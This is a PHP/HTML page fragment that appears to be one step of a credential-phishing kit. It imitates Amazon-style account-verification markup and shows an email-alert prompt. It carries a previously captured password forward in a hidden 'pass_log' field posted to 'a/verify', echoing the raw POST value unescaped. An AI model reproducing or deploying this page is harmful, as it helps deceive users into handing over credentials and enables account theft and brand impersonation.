	...
	<div class="a-section a-spacing-none">
		<div class="a-container a-global-nav-wrapper">
			<div class="a-section a-spacing-none a-text-center">
				<a class="a-link-nav-icon" tabindex="-1"><i class="a-icon a-icon-logo" role="img"></i></a>
			</div>
		</div>
	</div>
            ...
            <form method="post" action="a/verify" class="a-spacing-none">
              ...
              <input type="hidden" name="pass_log" value="<?= $_POST['pass_log']; ?>">
							...
							<div class="a-row a-spacing-small">
								<div class="a-row a-spacing-small">
                  <center><img src="img/email.png" width="100"></center><br><br>
									<h1><?= enc($ealert['1']); ?></h1>
								</div>
								<div class="a-row a-spacing-micro">
									<span><?= enc($ealert['2']); ?></span>
								</div>
								<div class="a-row a-spacing-micro">
									<span></span>
								</div>
							...
							<div class="a-row a-spacing-small">
								<span id="cvf-submit-otp-button" class="a-button a-button-span12 a-button-primary cvf-widget-btn cvf-widget-btn-verify" style="height: 47px;"><span class="a-button-inner"><input class="a-button-input" type="submit" aria-labelledby="cvf-submit-otp-button-announce"><span id="cvf-submit-otp-button-announce" class="a-button-text" aria-hidden="true"><?= enc($ealert['btn']); ?></span></span></span>
							</div>
						</form>
					</div>
				</div>
